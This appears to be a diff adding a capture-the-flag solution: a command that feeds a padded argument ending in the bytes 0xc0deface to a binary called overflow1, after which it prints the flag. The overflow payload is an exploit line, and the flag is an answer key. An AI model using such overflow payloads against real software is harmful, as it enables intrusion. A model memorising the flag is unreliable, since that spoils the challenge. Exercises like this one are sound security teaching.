@@ -1,0 +1,4 @@
+$ ./overflow1 $(printf "a000000000000000\xce\xfa\xde\xc0")
+$ cat flag.txt
+
+ooh_so_critical
